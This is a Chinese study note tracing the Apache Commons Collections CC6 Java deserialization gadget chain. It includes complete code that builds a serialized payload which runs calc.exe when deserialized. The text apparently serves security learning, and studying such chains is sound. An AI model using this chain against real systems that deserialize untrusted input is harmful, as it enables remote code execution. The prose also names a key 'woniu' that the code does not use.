[TOC]



# ==ApacheCC6链审计-mine==

ApacheCC6 的调用链， 在 ChainedTransformer 之后的调用链是一样的，所以本篇文章只讲解 ChainedTransformer 之前的调用链，再接上 ChainedTransformer 就好了

- **去寻找哪里在调用 transform 方法**

确定了一个叫做 org.apache.commons.collections.map.LazyMap 的类，其中的 get() 方法在调用 transform

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

将 factory 传入参数 为 ChainedTransformer ，然后 key 需要的参数为 Runtime 对象

我们再看如何传入 factory  参数

```java
protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = factory;
}
```

```java
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

利用该类的装饰方法进行类的实例化来达到参数传入的目的

map 单纯的使用 HashMap 就可以，因为该类并没有定义类属性叫做 map ，所以这个map是继承自他的父类的，越往上最终肯定就到了 Map 接口，所以都一样的

该类本很具有一个 readObject() 方法，但是该方法并不调用这个 get() 方法，所以我们还得另外寻找，

编写LazyMap类的调试代码

```java
package com.ymqyyds.vul;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class ApacheCC6 {
    public void test1() throws Exception {
        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
        Transformer[] transformers = new Transformer[] {
                constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map<Object,Object> hashmap = new HashMap<>();
        hashmap.put("ymq","yyds");
        Map<Object,Object> lazymap = LazyMap.decorate(hashmap, chainedTransformer); 
        lazymap.get("xxx");
    }

    public void unserial() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("./data/ApacheCC6.ser");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws Exception{
        ApacheCC6 apacheCC6 = new ApacheCC6();
        apacheCC6.test1();
//        apacheCC6.unserial();
    }
}
```

成功执行

- **哪里在调用 get() 方法**

org.apache.commons.collections.keyvalue.TiedMapEntry 类中的 getValue() 方法 在调用这个 get() 方法

```java
public Object getValue() {
    return map.get(key);
}
```

- **哪里在调用 getValue() 这个方法**

org.apache.commons.collections.keyvalue.TiedMapEntry 类中的 hashCode() 方法再调用这个 getValue() 方法

```java
public int hashCode() {
    Object value = getValue();
    return (getKey() == null ? 0 : getKey().hashCode()) ^
           (value == null ? 0 : value.hashCode()); 
}
```

```java
public TiedMapEntry(Map map, Object key) {
    super();
    this.map = map;
    this.key = key;
}
```

编写调试代码

```java
public void test1() throws Exception {
    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
    Transformer[] transformers = new Transformer[] {
        constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    Map<Object,Object> hashmap = new HashMap<>();
    hashmap.put("ymq","yyds");
    Map<Object,Object> lazymap = LazyMap.decorate(hashmap, chainedTransformer); 
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"nihao");
    // 由于第一次调用 transform 方法的是ConstantTransformer类，所以不用管key是啥。但是要注意，不能和 LazyMap 定义时，传入的 hashmap 的key一样，否则无法进入LazyMap 的if条件
    tiedMapEntry.hashCode();
}
```

成功执行

- **哪里在调用 hashCode() 这个方法**

java.util.HashMap 中的 hash(Object key) 方法在调用 hashCode()

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

然而因为 java.util.HashMap 自身的 put(K key, V value) 方法就在调用 hash 方法

```java
public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
```

所以编写调试代码

```java
public void test1() throws Exception {
    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
    Transformer[] transformers = new Transformer[] {
        constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    Map<Object,Object> hashmap = new HashMap<>();
    hashmap.put("ymq","yyds");
    Map<Object,Object> lazymap = LazyMap.decorate(hashmap, chainedTransformer);
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"nihao");
    // 由于第一次调用 transform 方法的是ConstantTransformer类，所以不用管key是啥。但是要注意，不能和 LazyMap 定义时，传入的 hashmap 的key一样，否则无法进入LazyMap 的if条件
    Map<Object,Object> newhashmap = new HashMap<>();
    newhashmap.put(tiedMapEntry,"ymqyyds");
}
```

- 所以暂时得到的代码就长下面这样

```java
public void test1() throws Exception {
    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
    Transformer[] transformers = new Transformer[] {
        constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    Map<Object,Object> hashmap = new HashMap<>();
    hashmap.put("ymq","yyds");
    Map<Object,Object> lazymap = LazyMap.decorate(hashmap, chainedTransformer);
    
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"nihao");
    // 由于第一次调用 transform 方法的是ConstantTransformer类，所以不用管key是啥。但是要注意，不能和 LazyMap 定义时，传入的 hashmap 的key一样，否则无法进入LazyMap 的if条件
    Map<Object,Object> newhashmap = new HashMap<>();
    newhashmap.put(tiedMapEntry,"ymqyyds");

    FileOutputStream fos = new FileOutputStream("./data/ApacheCC6.ser");
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(newhashmap);
}
```

但是运行报错

![image-20250121005049005](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250121005049005.png)

上述代码运行时，将会抛出异常，且会自已打开计算器：

```java
Exception in thread "main" java.io.NotSerializableException: java.lang.ProcessImpl
```

由于ProcessImpl不能被序列化，所以导致代码抛出异常，那么现在的问题就是要知道哪里会出现ProcessImpl对象。通过调试发现，TiedMapEntry的key为nihao，而其值lazyMap为一个ProcessImpl对象，导致出现异常。所以要避免这种对象的产生，不应该在实例化LazyMap时为其传递chainedTransformer，而是传递一个普通的Transformer对象，使其无法继续调用。

![image-20250121005808837](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250121005808837.png)

![image-20250121005820322](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250121005820322.png)

```java
Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(null));
```

但是此时并没有将ChainedTransformer对象传入Map中，所以导致反序列化时无法执行命令。所以需要将ChainedTransformer对象进行赋值，为LazyMap的factory属性赋值为ChainedTransformer，而LazyMap的factory属性为protected，不可见，所以需要通过反射进行赋值。

```java
Class clazz = lazyMap.getClass();Field factory = clazz.getDeclaredField("factory");
factory.setAccessible(true);
factory.set(lazyMap, chainedTransformer);
```

然后继续进行反序列化，发现并不能打开计算器。

5、调试代码，发现LazyMap的157行不满足条件，最终导致没有执行ChainedTransformer的transform方法。

![image-20230829040050226](https://gitee.com/ymq_typroa/typroa/raw/main/202308290400276.png)

所以需要将LazyMap实例中的woniu这条Key删除

```
lazyMap.remove("woniu");
```

- 最终代码

```java
public void test1() throws Exception {
    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
    Transformer[] transformers = new Transformer[] {
        constantTransformer, // 先放这个的目的是让他先执行，返回runtime对象
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    Map<Object,Object> hashmap = new HashMap<>();
    hashmap.put("ymq","yyds");

    Map<Object,Object> lazymap = LazyMap.decorate(hashmap, new ConstantFactory(null));  // new ConstantFactory(null)  这个是为了防止java.lang.ProcessImpl异常
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"nihao");

    // 由于第一次调用 transform 方法的是ConstantTransformer类，所以不用管key是啥。但是要注意，不能和 LazyMap 定义时，传入的 hashmap 的key一样，否则无法进入LazyMap 的if条件
    Map<Object,Object> newhashmap = new HashMap<>();
    newhashmap.put(tiedMapEntry,"ymqyyds");

    lazymap.remove("nihao");  // 这句代码必须要放到 newhashmap.put 之后，我靠，为神马


    Class clazz = LazyMap.class;
    Field factory = clazz.getDeclaredField("factory");
    factory.setAccessible(true);
    factory.set(lazymap,chainedTransformer);


    FileOutputStream fos = new FileOutputStream("./data/ApacheCC6.ser");
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(newhashmap);
}
```

